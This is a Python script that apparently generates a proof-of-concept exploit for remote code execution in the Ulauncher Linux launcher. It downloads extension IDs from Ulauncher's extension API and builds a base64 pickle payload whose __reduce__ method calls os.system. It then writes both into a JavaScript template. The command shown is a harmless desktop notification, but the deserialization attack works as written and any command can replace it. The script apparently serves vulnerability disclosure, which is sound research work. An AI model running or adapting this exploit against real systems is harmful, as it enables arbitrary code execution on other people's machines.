#!/usr/bin/env python3
import requests
from urllib.parse import urlparse
import pickle
import base64
import json


def main():
    extensions_ids = fetch_extensions_ids()
    payload = generate_pickle_payload()
    with open("poc.template.js", "r") as f:
        poc = f.read()
        poc = poc.replace("__EXTENSIONS_IDS__", json.dumps(extensions_ids))
        poc = poc.replace("__PAYLOAD__", json.dumps(payload))
        poc = "// Generated by generate_poc.py\n" + poc
    with open("poc.js", "w") as f:
        f.write(poc)
    print("poc.js generated")


def fetch_extensions_ids():
    response = requests.get(
        "https://ext-api.ulauncher.io/extensions?sort_by=GithubStars&sort_order=-1"
    )
    response.raise_for_status()
    extensions = response.json()
    ret = []
    for extension in extensions["data"]:
        url = urlparse(extension["GithubUrl"])
        domain = ".".join(reversed(url.netloc.split(".")))
        extension_id = (domain + url.path.replace("/", ".")).lower()
        ret.append(extension_id)
    return ret


def generate_pickle_payload():
    payload = pickle.dumps(UlauncherRCE())
    payload = base64.b64encode(payload).decode("utf-8")
    return payload


class UlauncherRCE(object):
    def __reduce__(self):
        import os

        # This is the command to execute on the target machine
        command = "notify-send pwnd; xdg-open ."
        return (os.system, (command,))


if __name__ == "__main__":
    main()